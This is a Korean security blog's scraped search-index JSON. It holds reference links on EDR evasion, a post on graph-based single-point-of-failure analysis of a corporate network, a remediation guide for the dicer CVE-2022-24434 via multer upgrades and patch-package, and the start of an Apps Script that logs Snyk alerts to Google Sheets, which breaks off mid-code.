https://www.halcyon.ai/blog/ransomware-attack-bypasses-edr-with-byoi-technique\n할시온. (2024년 4월 1일). 메두사, 비앙리안, 플레이 공격에 랜섬허브의 EDR 킬러가 등장합니다. 할시온. https://www.halcyon.ai/blog/ransomhubs-edr-killer-shows-up-in-medusa-bianlian-and-play-attacks\nSophos. (2023, 4월 19일). 프로세스 탐색기 드라이버를 악용하는 \u0026lsquo;AuKill\u0026rsquo; EDR 킬러 악성코드. Sophos News. https://news.sophos.com/en-us/2023/04/19/aukill-edr-killer-malware-abuses-process-explorer-driver/\n보안 목록. (2023년 3월 21일). APT 그룹 토디캣은 ESET의 취약점을 악용하여 DLL 프록시를 사용합니다. 시큐어리스트. https://securelist.com/toddycat-apt-exploits-vulnerability-in-eset-software-for-dll-proxying/116086/\n센티넬원. (2023년 7월 13일). 윈도우 디펜더로 생활하기: LockBit 랜섬웨어는 Microsoft 보안 도구를 통해 Cobalt Strike를 사이드로드합니다. SentinelOne. https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/\nSophos. (2019, 12월 9일). 스내치 랜섬웨어는 PC를 안전 모드로 재부팅하여 보호 기능을 우회합니다. Sophos 뉴스. https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/\nAttackIQ. (2023년 11월 1일). #StopRansomware: AvosLocker 랜섬웨어. AttackIQ. https://www.attackiq.com/2023/11/01/avoslocker-ransomware/\n비핑 컴퓨터. (2024년 1월 9일). 랜섬웨어 공격에 사용되는 새로운 \u0026ldquo;자체 설치 프로그램 가져오기\u0026rdquo; EDR 우회 방법. https://www.bleepingcomputer.com/news/security/new-bring-your-own-installer-edr-bypass-used-in-ransomware-attack/\n체크 포인트 리서치. (2025). 사일런트 킬러: 대규모 레거시 드라이버 익스플로잇 캠페인의 실체 밝혀내기. https://research.checkpoint.com/2025/large-scale-exploitation-of-legacy-driver/\nAhnLab ASEC. (2024). 인증서 확인 우회를 통한 레거시 드라이버 익스플로잇. https://asec.ahnlab.com/en/86881/\n트렌드 마이크로. (2022). AvosLocker 랜섬웨어 변종은 드라이버 파일을 악용하여 안티바이러스를 비활성화하고 Log4Shell을 검사합니다. 트렌드 마이크로 연구. https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html\nESET. (2025). 랜섬허브의 EDRKillShifter의 모래를 바꾸다. 위라이브시큐리티. https://www.welivesecurity.com/en/eset-research/shifting-sands-ransomhub-edrkillshifter/\n테크타겟. (2024). 블랙바이트 랜섬웨어, 새로운 EDR 회피 기법 사용. https://www.techtarget.com/searchsecurity/news/252525965/BlackByte-ransomware-uses-new-EDR-evasion-technique\n","permalink":"http://localhost:1313/ko/post/2025-05-28-endpoint-security-evasion-techniques-20202025/","summary":"EDR을 우회하기 위한 공격자들의 기술은 더욱 정교해지고 있습니다. 2020년부터 2025년까지의 대표적인 우회 기법(BYOI, BYOVD, DLL 하이재킹, 서비스 변조)을 기술 메커니즘, 실제 사례, 공급업체 영향 및 방어 전략 중심으로 분석합니다.","title":"엔드포인트 보안 우회 기법(2020-2025년) - 기술 심층 분석"},{"content":" 서론: 실패로부터 배우는 역사적 교훈 출처 1986년 1월 28일, 우주왕복선 챌린저호는 발사 73초 만에 폭발하였고 일곱 명의 승무원이 사망했습니다. 고무 재질의 O-링 하나가 추운 기온 속에서 제 기능을 하지 못한 것이 원인이었으며, 이는 전형적인 단일 실패 지점(SPOF)이 전체 시스템을 무너뜨린 사례였습니다. 이 사건은 SPOF를 설계 초기 단계에서 식별하고 제거하는 것이 얼마나 중요한지를 보여줍니다.\nSPOF는 하나의 요소가 실패함으로써 전체 시스템이 작동을 멈추게 되는 지점을 의미합니다. 사이버보안에서는 이러한 SPOF가 하드웨어, 네트워크, 소프트웨어, 프로세스 또는 인력까지 어디에든 숨어 있을 수 있습니다. 복원력을 확보하려면 SPOF를 제거하거나 대비책을 마련해야 합니다.\n현대 사이버보안 인프라의 SPOF 디지털 시스템이 복잡해질수록 SPOF는 오히려 더욱 잘 숨겨집니다. 예를 들어:\n중앙 인증 서버(예: Active Directory, SSO)가 다운되면 전체 로그인 중단 하나의 라우터나 방화벽 장애로 전체 지사 단절 클라우드 리전 하나에 의존할 경우 전체 인프라 마비 단일 관리자만이 백업 복구 방법을 알고 있는 경우, 랜섬웨어 복구 실패 탐지 시스템 또는 위협 인텔리전스 소스 하나에만 의존할 경우, 공격 탐지 실패 이처럼 시스템 설계 시 중복성과 대안 경로의 부재는 곧 SPOF로 이어집니다.\n그래프 모델을 이용한 공격 경로 분석 본 분석은 spofInCybersecurity GitHub 저장소에 공개된 사용자 정의 도구를 활용하여 수행되었습니다. 이 도구는 인프라를 graph.json 형태의 그래프로 정의하고, 경로 열거 및 노드 제거 시뮬레이션을 통해 SPOF 영향을 정량적으로 분석합니다.\n본 분석은 CyGraph와 마찬가지로 공격 그래프 기반 시각화를 활용하지만, 그 목적과 활용 방식에는 차이가 있습니다. CyGraph는 실시간 위협 탐지와 정책 상관분석에 강점을 가지며, 방화벽 규칙, 취약점 정보, 사용자 권한 등을 통합하여 공격 시나리오를 시각적으로 탐색합니다. 반면 본 분석은 실시간 탐지보다는 아키텍처 설계 수준에서의 구조적 병목점 식별과 SPOF 제거에 중점을 둡니다. 따라서 분석의 핵심은 노드 제거 시 경로 단절 효과를 정량화하여, 보안상 중요한 구조를 사전에 평가하고 개선하는 데 있습니다.\n본 분석은 공격 그래프 기반이며, SPOF 식별에 있어 노드 중심성과 경로 구조의 특성을 활용합니다.\n노드 중심성은 네트워크 내에서 특정 노드가 얼마나 중요한지를 수치화한 것입니다. 다음은 각 중심성 지표가 사이버보안 SPOF 분석에서 가지는 의미입니다:\n매개 중심성(Betweenness): 특정 노드가 다른 노드들 간의 경로에 얼마나 자주 등장하는지를 나타냅니다. 이 값이 높으면 공격 경로의 \u0026lsquo;허브\u0026rsquo; 역할을 하며, 제거 시 전체 흐름이 크게 단절될 수 있어 SPOF로 작용할 가능성이 큽니다.\n근접 중심성(Closeness): 해당 노드가 네트워크 내 다른 노드들과 얼마나 가까운지를 나타내며, 빠르게 영향을 확산시키거나 방어할 수 있는 위치를 뜻합니다. 이 값이 높은 노드는 대응 속도 측면에서 핵심적일 수 있습니다.\n연결 중심성(Degree): 직접 연결된 노드의 수를 나타내며, 단순히 많은 연결을 가진 노드가 어디인지 확인하는 데 유용합니다. 그러나 경로 전체의 연결성에 대한 영향은 낮을 수 있습니다.\n페이지랭크 중심성(PageRank): 다른 중요 노드로부터 얼마나 연결을 받는지를 고려하여 중요도를 평가합니다. 신뢰 기반 구조나 영향력 전파 구조에서 유용하며, 보안 허브나 인증 계층 분석에 활용될 수 있습니다.\n이 중심성 지표는 각 노드가 얼마나 구조적으로 연결되어 있는지를 판단하고, SPOF 후보를 수치적으로 분류하는 데 활용됩니다.\n경로 구조 기반 분석은 공격자가 진입점에서 유출점까지 도달하는 모든 가능한 경로를 열거하고, 특정 노드를 제거했을 때 경로가 몇 % 사라지는지를 시뮬레이션합니다. 이 경로 단절 효과가 큰 노드를 SPOF로 간주하며, 그 임계값을 기준으로 절대적, 상대적 등급을 부여합니다.\n이러한 접근은 기존 보안 그래프 시각화(예: CyGraph)와 달리 실시간 정책 평가보다는 구조적 병목점 제거에 집중합니다 [(참고)](https://onlinelibrary.wiley.com/doi/10.1155/2019/2031063)\nSPOF 식별을 위해 공격 그래프를 활용한 분석을 수행했습니다. 이를 위해 실제 기업 인프라를 기반으로 총 18개의 노드를 가진 그래프를 구축했습니다. 그래프의 노드들은 워크스테이션, 서버, 인프라 장비 등이며, 방향성 있는 엣지들은 공격자가 진행할 수 있는 이동 경로를 나타냅니다.\n공격 시나리오는 다음과 같은 단계로 구성됩니다:\n정찰(외부 → 내부 노출 장치 탐색): VPN_PC, OA_PC 등을 외부에서 탐색 가능 초기 침투(사용자 단말기 감염): 감염된 PC가 내부로 진입하는 게이트웨이 역할 수행 횡적 이동 및 권한 상승: 내부의 핵심 시스템(AD, SCCM, Vaccine 등)으로 이동 및 장악 악성코드 감염: SCCM, AD, Proxy를 통해 전체 단말기에 악성코드 전파 명령 및 제어(C2), 데이터 유출: 외부 서버(Hacker_Internet_forLeak)로 데이터 유출 이러한 모델은 전체 공격 전개 과정을 시각적으로 표현하며, SPOF 분석의 기초가 됩니다.\n방법론 상세: SPOF 식별을 위한 경로 가중치 기반 분석 경로 열거: 시작 노드(공격자)에서 종료 노드(유출 지점)까지의 모든 경로 계산\n노드 등장 빈도 가중치 적용: OA_PC처럼 수천 개가 있을 수 있는 노드는 낮은 가중치 부여\n노드 제거 시뮬레이션: 각 노드를 제거했을 때 남는 경로 수 계산\nSPOF 등급 분류:\n절대적 SPOF (≥80% 경로 제거 또는 ≥30% 가중치): Intranet_MGMT_Server, Server_Access_Gateway, Nutanix 상대적 SPOF (≥40% 제거 또는 ≥15% 가중치): SCCM, Active Directory, Vaccine, Proxy 등 중복 가능 노드 (≥10% 제거 또는 ≥5% 가중치): 초기 감염 지점들(VPN_PC 등) 낮은 중요도 노드 (\u0026lt;10% 영향): VDI 서비스 등 시각화 결과 Figure 1: SPOF 등급별로 색상으로 시각화된 네트워크 그래프입니다. 절대적 SPOF는 빨간색 노드, 상대적 SPOF는 노란색, 중복 가능한 노드는 파란색, 낮은 위험 노드는 회색으로 구분되어 있으며, 공격 경로는 검은색, 명령/제어(C2) 연결은 빨간 선, 종단 단말 연결은 점선으로 표시됩니다.\n위 시각화는 spofInCybersecurity 도구의 출력 결과 중 하나로, 실제 공격 경로를 기반으로 18개 노드 간의 상호작용과 SPOF 등급을 나타낸 것입니다. 주요 분석 수치는 다음과 같습니다:\n총 경로 수: 470개 Intranet_MGMT_Server: 경로 중 290건 포함 (61.7%), 제거 시 SPOF 등급: 절대적 Server_Access_Gateway: 55.1% 경로 제거, SPOF 등급: 절대적 Nutanix: 50.6% 경로 제거, SPOF 등급: 절대적 SCCM, Active Directory, Vaccine: 각각 21.3%, SPOF 등급: 상대적 해당 수치는 분석 코드 calc_spof_from_json.py의 실제 실행 결과이며, 단일 노드 제거가 전체 경로에 얼마나 영향을 주는지를 기반으로 SPOF 등급이 결정됩니다.\nSPOF 중심성 평가 및 분석 통찰 본 분석는 네트워크 중심성 이론 중에서도 특히 매개 중심성(Betweenness Centrality) 개념과 유사한 방식으로 SPOF를 평가합니다. 실제로 사용된 calc_spof_from_json.py 코드는 모든 가능한 공격 경로를 열거한 후, 각 노드가 중간 경유지로서 얼마나 자주 등장하는지를 계산합니다. 이 수치는 중심성 점수처럼 활용되며, 실제 제거 시 얼마나 많은 경로가 단절되는지를 측정해 SPOF 등급으로 분류합니다. 즉, 전통적인 수학 기반 중심성 계산 대신, **현실적인 공격 시나리오 기반 중심성 근사치는 실제 공격자가 사용할 수 있는 경로를 기반으로 각 노드가 얼마나 중요한 위치에 있는지를 반영한 근사값입니다. 분석 도구는 다음과 같은 과정을 통해 중심성을 계산합니다:\n모든 단순 경로 열거: 그래프 내에서 시작점부터 종료점까지 가능한 모든 경로를 계산합니다. 중간 노드 등장 횟수 계산: 각 노드가 중간 경유지로서 얼마나 자주 등장하는지를 빈도로 측정합니다. 노드별 가중치 적용: 등장 빈도에 노드별 가중치를 곱하여 중요도를 정량화합니다. 예를 들어, 다수 존재하는 OA_PC는 0.0005, 핵심 서버는 1.0과 같은 가중치를 적용합니다. 경로 단절 효과 평가: 해당 노드를 제거했을 때 전체 경로가 몇 % 단절되는지를 분석하여 SPOF 등급으로 분류합니다. 이 접근법은 전통적인 그래프 이론의 중심성 계산 방식과는 다르지만, 사이버보안 공격 시나리오에 적합한 현실 기반 중심성 평가 모델로서 유의미한 결과를 도출합니다.\n그래프 이론에서 SPOF는 단순히 연결된 수나 경고 발생 수로 판단되지 않습니다. 우리는 다음과 같은 중심성 개념을 참고하여 평가를 수행했습니다 (참고):\n매개 중심성 (Betweenness): 경로에서 얼마나 자주 해당 노드를 지나치는가 근접 중심성 (Closeness): 다른 모든 노드에 얼마나 빠르게 도달할 수 있는가 연결 중심성 (Degree): 직접 연결된 노드의 수 페이지랭크 중심성: 중요 노드로부터 연결될 확률 기반 평가 이러한 다양한 중심성은 각각 사이버보안 분석에서 실질적인 함의를 가집니다:\n매개 중심성이 높은 노드는 다양한 경로의 \u0026lsquo;허브\u0026rsquo; 역할을 하므로 제거 시 전체 경로가 단절될 가능성이 크며, 구조적 SPOF로 간주될 수 있습니다. 근접 중심성이 높은 노드는 다른 노드들과의 평균 거리(탐색 시간)가 짧기 때문에, 빠르게 위협이 확산되거나 방어가 전달되는 위치로 기능합니다. 연결 중심성은 연결 수 자체는 많을 수 있지만, 네트워크 구조 내에서의 위치나 경로 연결성에 따라 SPOF가 아닐 수도 있습니다. 다만 외부 노출 지점 등에서 초기 침투 통로로 기능할 수 있습니다. 페이지랭크 중심성이 높은 노드는 중요한 노드들로부터 신뢰받거나 종속된 위치에 있는 경우가 많아, 자격 증명 탈취나 인증 시스템 SPOF 분석에 활용될 수 있습니다. 이러한 중심성 개념은 단순 수학적 지표를 넘어 실제 아키텍처 내 구조적 취약점을 판별하는 데 도움을 주며, SPOF 탐지 정확도를 높일 수 있었습니다.\n분석을 통해 얻은 주요 통찰 조용한 SPOF 발견: Nutanix는 사고 이력이 없지만 구조적으로 필수적 노드 경고 빈도와 구조적 중요성 불일치: 많은 경고가 난 단말기보다 중앙 서버가 중요 방어 중첩 부족 확인: 단일 게이트웨이로 AD/백업 시스템이 모두 연결된 설계는 SPOF 생성 그래프 중심성 개념과 유사: 경로 기반 중심성(betweenness)을 SPOF 분류 기준으로 응용 그래프 구축 및 LLM 전처리 흐름 예시 (LangChain 사례, 혹은 ChatGPT 기반 구성도 가능) 공격 그래프는 수작업이 아닌 반자동화된 방식으로 생성되었습니다. 기업 내부 문서(방화벽 설정, 네트워크 토폴로지 설명, 감사 보고서 등)를 LLM에 입력하여 구조화된 노드/엣지 목록(graph.json)으로 변환하였습니다.\nLLM 적용 흐름:\n자연어 설명 입력 예시:\n\u0026ldquo;Firstfloor_PC는 Server_Access_Gateway를 통해 Intranet_MGMT_Server에 접근 가능하며, AD는 모든 OA_PC에 정책을 전파함\u0026rdquo;\n프롬프트 예시:\n\u0026ldquo;이 내용을 기반으로 그래프 노드와 방향성 엣지 목록을 JSON으로 출력해줘\u0026rdquo;\n출력 예시:\n{ \u0026#34;nodes\u0026#34;: [\u0026#34;Firstfloor_PC\u0026#34;, \u0026#34;Server_Access_Gateway\u0026#34;, \u0026#34;Intranet_MGMT_Server\u0026#34;, \u0026#34;AD\u0026#34;, \u0026#34;ALL_OA_PC\u0026#34;], \u0026#34;edges\u0026#34;: [ {\u0026#34;from\u0026#34;: \u0026#34;Firstfloor_PC\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;Server_Access_Gateway\u0026#34;}, {\u0026#34;from\u0026#34;: \u0026#34;Server_Access_Gateway\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;Intranet_MGMT_Server\u0026#34;}, {\u0026#34;from\u0026#34;: \u0026#34;AD\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;ALL_OA_PC\u0026#34;} ] } 이러한 변환은 사람이 놓치기 쉬운 간접 연결이나 정책 경로를 반영하는 데 유용하며, 이후 수작업 검증 및 추가 보완을 통해 신뢰성을 확보합니다. LangChain 없이도 ChatGPT 또는 GPT API를 직접 활용하여 이러한 전처리를 수행할 수 있으며, 복잡한 문서 분석이 반복되지 않는 초기 분석 단계에서는 별도 파이프라인 없이도 충분히 적용 가능합니다.\nSPOF 등급별 대응 전략 요약 CrowdStrike, CDK Global, American Express 사례를 보면, 제3자 서비스와 보안 프로그램의 단일 실패가 전체 기업 서비스에 영향을 미쳤습니다. 이는 SPOF 완화 전략의 필요성을 구체적으로 뒷받침합니다 (Amex 사례).\nSPOF 등급 예시 노드 위험도 기준 권장 대응 전략 절대적 Intranet_MGMT_Server, Nutanix ≥80% 경로 제거 이중화, 집중 모니터링, 설계 분산 상대적 SCCM, Active Directory ≥40% 경로 제거 마이크로세그멘테이션, 접근 제어 강화, 배포 경로 제한 중복 가능 VPN_PC, OA_PC ≥10% 경로 제거 탐지 강화를 통한 초기 탐지, 행동기반 차단 정책 낮음 VDI 인프라 등 \u0026lt;10% 영향도 표준 보안 유지 수준 유지 대부분의 네트워크 문서는 자연어로 기술되어 있어 직접적인 그래프 생성이 어렵습니다. 이를 해결하기 위해 LLM을 사용하여 문서(방화벽 설정, 아키텍처 다이어그램 등)를 해석하고 graph.json 형태로 노드 및 엣지를 추출하였습니다. 이 과정은 지속적인 분석 자동화에도 기여할 수 있습니다.\n전략적 시사점 및 투자 방향 절대적 SPOF에 즉각적 투자: 이중화, 하드닝, 집중 모니터링 상대적 SPOF는 점진적 개선: 구간별 모니터링, 액세스 분리, 배포 경로 제한 등 보안 예산 정당화 도구: \u0026ldquo;이 노드 하나만 보완해도 전체 경로의 80% 제거 가능\u0026rdquo; 지속적 SPOF 재평가 필요: 클라우드 전환, 인수합병 등 변화 대응 위해 주기적 분석 수행 최근 사례: SPOF 위험을 보여주는 글로벌 사이버공격 (CSIS 보고서) 우크라이나 사이버공격 (2025년 1월): 러시아의 사이버공격은 2024년 대비 70% 증가, 정부/에너지/국방 분야에 4,000건 이상 발생. 대부분 중앙 집중식 시스템을 노린 공격으로, SPOF의 실질적 위협을 드러냄. (CSIS 보고서) 대만 사이버공격 (2025년 1월): 중국의 사이버공격 시도 일일 240만 건, 통신/정부 시스템에 대한 공격 성공률 20% 증가. SPOF가 존재하는 중요 인프라의 치명성을 입증. 미국 재무성 제3자 벤더 해킹 (2024년 12월): 제3자 벤더를 통한 우회 경로로 3,000건 이상의 비분류 문서 접근. 중앙 정부 시스템이 아닌 공급망 SPOF의 전형적 사례. 아메리칸 익스프레스 제3자 데이터 유출 (2024년 3월): 카드 결제 처리업체 해킹을 통해 고객 정보 유출. 자체 시스템은 안전했지만, SPOF가 제3자에 위치한 예시. SK텔레콤 해킹 사건 (2025년): 중앙 SIM 인증 서버가 단일 SPOF로 작용. 수백만 사용자 서비스 중단. 이러한 사례들은 중앙 집중 설계 또는 제3자 의존성이 실질적인 SPOF로 작용할 수 있음을 보여줍니다.\n중앙 SIM 인증 시스템(HSS)이 단일화되어 있었고, 이 시스템이 공격당하면서 수백만 사용자 통신 중단 \u0026ldquo;탈중앙화하지 않으면 붕괴한다\u0026quot;는 교훈이 남음 미래 전망: 기술 변화와 SPOF 대응 전략 지식 그래프를 활용한 최신 보안 분석 연구에서는, SPOF 식별에 있어 단순 노드 기반 분석보다 의미론적 관계와 추론 기반의 연결성 모델링이 중요하다고 제시됩니다 (참고), (Springer 논문).\nAI 기반 자동화: LLM 등 인공지능 기술은 공격 그래프 생성과 SPOF 탐지의 자동화를 가능케 함. 미래에는 실시간 위험 평가 및 예측도 가능해질 전망.\n양자 컴퓨팅의 위협과 대비: 양자 컴퓨팅은 기존 암호 시스템을 무력화할 수 있으며, 이는 인증 서버나 암호화 SPOF를 직접적으로 위협. 양자 저항 암호 도입이 필요.\n디지털 트윈 기반 시뮬레이션: 실제 인프라를 복제한 디지털 트윈 환경에서 SPOF 시나리오를 반복 테스트하고 대응 전략을 미리 검증 가능.\nAI 기반 자동화: LLM 등 인공지능 기술은 공격 그래프 생성과 SPOF 탐지의 자동화를 가능케 함. 미래에는 실시간 위험 평가 및 예측도 가능해질 전망.\n양자 컴퓨팅의 위협과 대비: 양자 컴퓨팅은 기존 암호 시스템을 무력화할 수 있으며, 이는 인증 서버나 암호화 SPOF를 직접적으로 위협. 양자 저항 암호 도입이 필요.\n디지털 트윈 기반 시뮬레이션: 실제 인프라를 복제한 디지털 트윈 환경에서 SPOF 시나리오를 반복 테스트하고 대응 전략을 미리 검증 가능.\n결론 그래프 기반 SPOF 분석은 위협 탐지가 아닌 아키텍처 기반의 방어 전략 수립에 핵심 도구로 작용합니다. 과거의 실패와 구조적 취약성을 AI와 결합해 사전에 식별하고 제거함으로써, 사이버공격의 확산을 구조적으로 방지할 수 있습니다.\n참고 링크 및 자료 🔗 소스코드 및 도구 GitHub 저장소 – spofInCybersecurity LangChain 튜토리얼 – LLM 기반 그래프 생성 📚 공격 그래프 및 중심성 관련 자료 Survey of Attack Graph Analysis Methods (Wiley, 2019) CyGraph: Graph-Based Analytics for Cybersecurity 공격 그래프 개념 - SentinelOne 노드 중요도 기반 보안 연구 - Nature 🧠 지식 그래프 및 AI 기반 분석 Cybersecurity Knowledge Graphs (Springer, 2023) Recent Progress Using Knowledge Graph for Cybersecurity (2022) 📌 SPOF 개념 및 구조적 취약점 SPOF 정의 - TechTarget SPOF 사례 - InvGate Blog 중앙 인증 시스템의 한계 - GeeksforGeeks 📰 사례 연구 및 실제 공격 사례 출처 CSIS – Significant Cyber Incidents American Express Third-Party Data Breach Timeline SK텔레콤 해킹 사건 분석 - an4t.com 🛰 역사적 비유 및 도입부 출처 챌린저호 폭발 사고 요약 ","permalink":"http://localhost:1313/ko/post/2025-05-15-spof-analysis-in-cybersecurity/","summary":"단일 실패 지점(SPOF)의 위협을 역사적 사례와 그래프 이론에 기반해 분석하고, 사이버보안 인프라의 구조적 약점을 사전에 식별하는 전략적 접근 방식을 제시합니다.","title":"사이버보안의 SPOF: 역사에서 전략까지, 그래프 기반 분석"},{"content":"🧭 요약 항목 내용 취약점 ID CVE-2022-24434 영향 범위 dicer → busboy → multer 간접 영향 위험 수준 High (DoS - 서비스 거부) 해결 버전 multer@1.4.4-lts.1 릴리스 일자 2022년 5월 29일 Node.js 최소 버전 ≥ 6.0.0 대응 요약 busboy 의존성 업데이트를 통해 dicer 취약점 우회 또는 제거 🧨 취약점 개요 공격 방법: multipart/form-data 요청의 헤더를 공백/탭 문자로 조작 시 서버 충돌 유발 문제 위치: HeaderParser.prototype._parseHeader() (Dicer 내부) 공식 보고일: 2022년 5월 20일 (NVD 링크) Express → Multer → Busboy → Dicer (취약점 위치) 🔧 패치 세부 내용 ✅ Multer 1.4.4-lts.1 busboy 1.6.0 이상 사용 → dicer 우회 NestJS에서도 채택됨 (PR #9686) ⚠️ dicer는 공식 패치 없음 PR 존재: #22 하지만 병합 및 릴리스 X → 여전히 취약 📦 의존성 체인 분석 패키지 취약 여부 패치 제공 여부 비고 Multer 간접 영향 ✅ 1.4.4-lts.1 busboy 의존성 업그레이드 포함 Busboy 간접 영향 ✅ 1.6.0 이상 dicer 제거 또는 우회 추정 Dicer 직접 영향 ❌ 없음 PR만 존재, 미병합 🛠 대응 가이드 1️⃣ Node.js 업그레이드 최소: v6.0.0 이상 권장: v14 이상 2️⃣ Multer 업그레이드 npm install multer@1.4.4-lts.1 또는 package.json:\n\u0026#34;dependencies\u0026#34;: { \u0026#34;multer\u0026#34;: \u0026#34;^1.4.4-lts.1\u0026#34; } 3️⃣ npm overrides (npm ≥ 8.3.0) \u0026#34;overrides\u0026#34;: { \u0026#34;multer\u0026#34;: \u0026#34;^1.4.4-lts.1\u0026#34; } 4️⃣ 패치 직접 적용 (정식 패치 없을 경우) patch-package로 dicer 임시 패치 npm install patch-package --save-dev package.json:\n\u0026#34;scripts\u0026#34;: { \u0026#34;postinstall\u0026#34;: \u0026#34;patch-package\u0026#34; } dicer 내부 수정 (node_modules/dicer/lib/Dicer.js):\n@@ -124,7 +124,11 @@ this._bparser.on(\u0026#39;info\u0026#39;, function(isMatch, data, start, end) { - self._oninfo(isMatch, data, start, end); + try { + self._oninfo(isMatch, data, start, end); + } catch (e) { + self.emit(\u0026#39;error\u0026#39;, e); + } }); npx patch-package dicer ⚠️ 이 방식은 정식 패치가 아니며, dicer 버전 변경 시 재작성 필요\n🔍 장기 고려사항 dicer는 유지보수 상태가 좋지 않음 @fastify/busboy 또는 fastify-multipart 등 대체 구조 고려 필요 📚 참고 자료 🔒 CVE-2022-24434 (NVD) 📦 Multer GitHub Releases 🛠 Dicer PR #22 ✅ NestJS PR #9686 🧪 Snyk Report for Multer 🗂 Stack Overflow 사례 ✅ 결론 Multer@1.4.4-lts.1은 CVE-2022-24434에 대한 간접 대응 버전 Node.js 6 이상 환경에서는 업그레이드만으로 안전하게 대응 가능 장기적으로는 구조적 대체 또는 의존성 제거 전략이 필요 ","permalink":"http://localhost:1313/ko/post/2025-05-12-cve-cve-2022-24434-dicer/","summary":"Multer 의존성을 통해 간접적으로 영향을 받는 Dicer 모듈의 취약점을 분석하고, 실제 대응 방안을 정리했습니다. 유지보수 중단된 오픈소스에 대한 현실적인 대응 예시로 활용할 수 있습니다.","title":"Dicer 모듈 취약점 대응 가이드: CVE-2022-24434"},{"content":"\n동기 처음에는 Snyk의 공식 API만으로도 충분히 자동화가 가능할 거라 생각했습니다. 하지만 실제로는 \u0026ldquo;How to Fix\u0026rdquo;, \u0026ldquo;Overview\u0026rdquo;, 그리고 안전한 버전 정보 등 많은 유용한 데이터가 웹 UI에만 노출되어 있었고, API로는 모두 수집할 수 없었습니다.\n그래서 저는 Gmail과 Google Apps Script를 활용해 직접 자동 수집기를 만들었습니다. 이 스크립트는 \u0026ldquo;no remediation available yet\u0026quot;라는 문구가 포함된 이메일을 읽고, 취약점 페이지에 접근하여 관련 정보를 추출합니다.\n주요 기능 Gmail에서 \u0026ldquo;no remediation available yet\u0026rdquo; 문구가 포함된 Snyk 알림 이메일 검색\n취약점 상세 페이지로 리디렉션된 링크 추적\n아래 정보 자동 파싱:\n취약점 이름 및 링크 영향 받는 패키지 및 버전 해결 방법 (FAQ JSON-LD 기반) Overview 텍스트 및 참고 링크 최신 버전 정보 (latest, non-vulnerable, 배포일) 모든 정보를 Google Sheets에 저장\n스크린샷 예시 Gmail 필터링 결과 Apps Script 로그 확인 출력된 구글 시트 전체 코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 function extractSnykNoFixToSheet() { const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet(); sheet.clearContents(); sheet.appendRow([ \u0026#34;Date\u0026#34;, \u0026#34;Subject\u0026#34;, \u0026#34;Project\u0026#34;, \u0026#34;Vulnerability\u0026#34;, \u0026#34;Vuln Link\u0026#34;, \u0026#34;Package\u0026#34;, \u0026#34;Version\u0026#34;, \u0026#34;Snyk Package Link\u0026#34;, \u0026#34;How to Fix\u0026#34;, \u0026#34;Overview Text\u0026#34;, \u0026#34;Overview Links\u0026#34;, \u0026#34;References\u0026#34;, \u0026#34;Latest Ver\u0026#34;, \u0026#34;Non-Vuln Ver\u0026#34;, \u0026#34;First Published\u0026#34;, \u0026#34;Latest Published\u0026#34; ]); const threads = GmailApp.search(\u0026#39;\u0026#34;no remediation available yet\u0026#34;\u0026#39;); threads.forEach(thread =\u0026gt; { thread.getMessages().forEach(msg =\u0026gt; { const date = msg.getDate(); const subject = msg.getSubject(); const body = msg.getBody(); const iconBlockMatch = body.match(/\u0026lt;img[^\u0026gt;]+icon-cli\\.webp[^\u0026gt;]*\u0026gt;[\\s\\S]*?\u0026lt;strong[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/strong\u0026gt;/i); const project = iconBlockMatch ? iconBlockMatch[1].trim() : \u0026#34;\u0026#34;; const vulnMatch = body.match(/\u0026lt;img[^\u0026gt;]+icon-vuln\\.webp[^\u0026gt;]*\u0026gt;[\\s\\S]{0,300}?\u0026lt;a[^\u0026gt;]+href=\u0026#34;([^\u0026#34;]+)\u0026#34;[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/a\u0026gt;/i); let vulnUrl = vulnMatch ? vulnMatch[1].trim() : \u0026#34;\u0026#34;; const vulnName = vulnMatch ? vulnMatch[2].trim() : \u0026#34;\u0026#34;; const packageMatch = body.match(/Vulnerability in (@?[a-zA-Z0-9_.:\\/\\-]+)\\s+([0-9][a-zA-Z0-9.\\-_]*)/); const pkgName = packageMatch ? packageMatch[1].trim() : \u0026#34;\u0026#34;; const pkgVer = packageMatch ? packageMatch[2].trim() : \u0026#34;\u0026#34;; let howToFix = \u0026#34;\u0026#34;, overviewText = \u0026#34;\u0026#34;, overviewLinks = \u0026#34;\u0026#34;, references = \u0026#34;\u0026#34;, subtitleMatch, snykPkgLink; let latestVer = \u0026#34;\u0026#34;, nonVulnVer = \u0026#34;\u0026#34;, firstPublished = \u0026#34;\u0026#34;, latestPublished = \u0026#34;\u0026#34;; try { Logger.log(`🔗 Trying redirect fetch: ${vulnUrl}`); const resp = UrlFetchApp.fetch(vulnUrl, { followRedirects: false, muteHttpExceptions: true }); const status = resp.getResponseCode(); const headers = resp.getAllHeaders(); const redirected = headers[\u0026#34;Location\u0026#34;] || headers[\u0026#34;location\u0026#34;] || vulnUrl; Logger.log(`📥 Response Code: ${status}`); Logger.log(`📎 Location Header: ${redirected}`); vulnUrl = redirected; } catch (e) { Logger.log(`🔥 Exception during redirect check for ${vulnUrl}: ${e}`); } try { const html = UrlFetchApp.fetch(vulnUrl).getContentText(); Logger.log(`📄 HTML content preview (first 1000 chars):\\n${html.slice(0, 1000)}`); subtitleMatch = 